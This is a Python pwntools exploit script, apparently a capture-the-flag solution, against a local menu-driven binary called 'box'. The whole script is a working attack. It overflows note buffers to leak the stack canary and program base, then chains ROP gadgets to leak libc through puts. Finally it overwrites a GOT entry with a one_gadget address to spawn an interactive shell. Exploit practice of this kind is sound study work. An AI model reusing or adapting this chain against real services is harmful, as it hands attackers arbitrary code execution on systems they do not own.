from pwn import *

context.arch='amd64'
libc = ELF('./libc.so.6')
elf  = ELF('./box')

def register(account, password):
	r.sendlineafter('>', '1')
	r.sendafter(':', account)
	r.sendafter(':', password)

def login(account, password):
	r.sendlineafter('>', '2')
	r.sendlineafter(':', account)
	r.sendlineafter(':', password)

def new(content):
	r.sendlineafter('>', '1')
	r.sendlineafter('>', content)

def update(idx, content):
	r.sendlineafter('>', '2')
	r.sendlineafter('?', str(idx))
	r.sendafter('>', content)

def view():
	r.sendlineafter('>', '3')

def delete(idx):
	r.sendlineafter('>', '4')
	r.sendlineafter('?', str(idx))

def logout():
	r.sendlineafter('>', '5')

r = process('./box')

register('a', 'a')
login('a', 'a')
for _ in range(8):
	new('a')
delete(5)
new('5'*232)
update(6, '6'*232+'\xff')
new('6')
update(7, '7'*233)
view()
data = r.recvuntil('1.')[-17:-3]
canary = u64('\x00'+data[1:8])
print "canary : ", hex(canary)

update(7, '7'*248)
view()
text_base = u64(r.recvuntil('1.')[-9:-3]+'\x00'*2)-0x123f
print "text_base @ ", hex(text_base)

buf        = text_base + 0x202060
leave      = text_base + 0xb82
pop_rdi    = text_base + 0x12d3
pop_r12345 = text_base + 0x12cc
call       = text_base + 0x12b0

rop = flat(0, pop_rdi, text_base+elf.got['puts'], text_base+elf.plt['puts'],
		   pop_r12345, text_base+elf.got['read'], 0, buf+0x98, 8, call)
update(7, ('7'*0x50 + rop).ljust(232) + flat(canary, buf+0x50, leave))
logout()

r.recvuntil('>\n')
libc_base = u64(r.recvn(6)+'\x00'*2) - libc.symbols['puts']
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_shot = libc_base + one_gadget[2]

r.sendline(p64(one_shot))

r.interactive()